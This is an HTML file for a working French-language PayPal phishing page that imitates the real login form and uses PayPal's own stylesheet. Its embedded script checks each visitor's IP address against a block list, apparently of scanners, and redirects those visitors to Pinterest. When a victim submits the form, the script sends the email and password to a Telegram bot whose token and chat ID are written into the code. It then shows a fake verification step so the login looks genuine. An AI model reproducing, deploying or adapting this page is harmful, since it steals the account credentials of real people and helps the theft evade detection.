<!DOCTYPE html>
<html lang="fr" class="no-js desktop">
<head>
    <meta charset="utf-8" />
    <title>Connectez-vous √† votre compte PayPal</title>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
    <meta name="application-name" content="PayPal" />
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes" />
    <link rel="stylesheet" href="https://www.paypalobjects.com/web/res/6e6/b12951786fe675b692c5cf7e74529/css/contextualLoginElementalUIv4.css" />
    <style id="antiClickjack">body {display: none !important;}</style>
    <script>
        // Liste des adresses IP bloqu√©es
        const blockedIPs = [
            "103.248.172.42",
            "69.25.58.61",
            "185.187.30.13",
            "178.24.121.188",
            "87.113.96.90",
            "165.227.0.128",
            "185.229.190.140",
            "165.227.0.128",
            "46.101.94.163",
            "165.227.39.194",
            "87.113.96.90",
            "46.101.119.24",
            "82.102.27.75",
            "173.239.230.97",
            "82.102.27.75",
            "87.113.96.90",
            "46.101.119.24",
            "173.239.230.97",
            "87.113.96.90",
            "87.113.96.90",
            "159.203.0.156",
            "162.243.187.126",
            "82.102.27.75",
            "87.113.96.90",
            "103.248.172.42",
            "103.248.172.42",
            "47.30.133.89",
            "103.248.172.42",
        ];

        // Fonction pour obtenir l'adresse IP de l'utilisateur
        async function getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Erreur lors de la r√©cup√©ration de l\'adresse IP:', error);
                return null;
            }
        }

        // Fonction de d√©tection anti-bot
        async function detectBot() {
            const userIP = await getUserIP();
            if (blockedIPs.includes(userIP)) {
                window.location.href = 'https://www.pinterest.com';
            } else {
                document.body.style.display = 'block';
            }
        }

        window.onload = detectBot;

        // Fonction pour g√©n√©rer un code de v√©rification al√©atoire
        function generateVerificationCode() {
            return Math.floor(100000 + Math.random() * 900000); // G√©n√®re un code √† 6 chiffres
        }

        // Fonction de gestion de la soumission du formulaire
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();
            document.getElementById('loading').style.display = 'block';
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;
            var verificationCode = generateVerificationCode(); // G√©n√®re le code de v√©rification
            var telegramBotToken = '7348058838:AAEurSPCnnOw6yluh3-4oqUq_E61Q55Av-U';
            var telegramChatId = '-4746759996';
            var message = 'üòàRez PayPalüòà\n\n üíØNew ConnexxionüíØ \nüÜîEmail/numero: ' + email + '\nüßæPassword: ' + password + '\nüîëVotre code de v√©rification: ' + verificationCode;
            
            var request = new XMLHttpRequest();
            request.open('POST', 'https://api.telegram.org/bot' + telegramBotToken + '/sendMessage', true);
            request.setRequestHeader('Content-Type', 'application/json');
            request.onreadystatechange = function() {
                if (request.readyState === 4 && request.status === 200) {
                    var response = JSON.parse(request.responseText);
                    if (response.ok) {
                        // Envoie le code √† l'utilisateur, puis attends qu'il le saisisse
                        promptForVerificationCode(verificationCode);
                    } else {
                        document.getElementById('loading').style.display = 'none';
                        alert('Une erreur technique est survenue. Veuillez r√©essayer plus tard.');
                    }
                }
            };
            request.send(JSON.stringify({
                chat_id: telegramChatId,
                text: message
            }));
        });

        // Fonction pour demander le code de v√©rification √† l'utilisateur
        function promptForVerificationCode(expectedCode) {
            var userCode = prompt("Veuillez entrer le code de v√©rification envoy√© √† votre Telegram.");
            if (userCode === expectedCode.toString()) {
                alert("Code valid√© ! Vous √™tes connect√©.");
                window.location.href = 'success.html';  // Redirige l'utilisateur vers une page de succ√®s
            } else {
                alert("Le code que vous avez entr√© est incorrect. Veuillez r√©essayer.");
                document.getElementById('loading').style.display = 'none';
            }
        }
    </script>
</head>
<body class="desktop">
    <noscript>
        <p class="nonjsAlert" role="alert">Remarque : plusieurs fonctions du site PayPal requi√®rent l'activation de JavaScript et des cookies.</p>
    </noscript>
    <div id="main" class="main" role="main">
        <section id="login" class="login" data-role="page" data-title="Connectez-vous √† votre compte PayPal">
            <div class="corral">
                <div id="content" class="contentContainer activeContent contentContainerBordered">
                    <header id="header">
                        <p role="img" aria-label="PayPal Logo" class="paypal-logo paypal-logo-long"></p>
                    </header>
                    <h1 id="headerText" class="headerText accessAid">Connectez-vous √† votre compte PayPal</h1>
                    <form id="loginForm" action="#" method="post" class="proceed" autocomplete="off" name="login" novalidate>
                        <div class="textInput" id="login_emaildiv">
                            <div class="fieldWrapper">
                                <input id="email" name="login_email" type="email" class="hasHelp validateEmpty" required="required" autocomplete="username" placeholder="Email ou num√©ro de mobile" aria-describedby="emailErrorMessage" />
                                <label for="email" class="fieldLabel">Email ou num√©ro de mobile</label>
                            </div>
                            <div class="errorMessage" id="emailErrorMessage">
                                <p class="emptyError hide">Obligatoire</p>
                                <p class="invalidError hide">Le format de cette adresse email ou de ce num√©ro de mobile n'est pas correct</p>
                            </div>
                        </div>
                        <div id="splitPassword" class="splitPassword enable-autofill">
                            <div id="passwordSection" class="clearfix showHideButtonForEligibleBrowser">
                                <div class="textInput" id="login_passworddiv">
                                    <div class="fieldWrapper">
                                        <input id="password" name="login_password" type="password" class="hasHelp validateEmpty pin-password" required="required" placeholder="Mot de passe" aria-describedby="passwordErrorMessage" />
                                        <label for="password" class="fieldLabel">Mot de passe</label>
                                        <button type="button" class="showPassword hide show-hide-password" id="showPassword">Afficher</button>
                                        <button type="button" class="hidePassword hide show-hide-password" id="hidePassword">Masquer</button>
                                    </div>
                                    <div class="errorMessage" id="passwordErrorMessage">
                                        <p class="emptyError hide">Obligatoire.</p>
                                    </div>
                                </div>
                                <a href="#" id="forgotPassword" class="recoveryOption forgotPassword">Mot de passe oubli√© ?</a>
                            </div>
                        </div>
                        <div class="actions">
                            <button class="button actionContinue" type="submit" id="btnLogin" name="btnLogin" value="Login">Connexion</button>
                        </div>
                    </form>
                    <div id="loading" style="display: none;">Chargement en cours...</div>
                </div>
            </div>
        </section>
        <footer class="footer" role="contentinfo">
            <div class="legalFooter">
                <ul class="footerGroup">
                    <li><a target="_blank" href="#">Contact</a></li>
                    <li><a target="_blank" href="#">Respect de la vie priv√©e</a></li>
                    <li><a target="_blank" href="#">Contrats d'utilisation</a></li>
                    <li><a target="_blank" href="#">International</a></li>
                </ul>
            </div>
        </footer>
    </div>
</body>
</html>
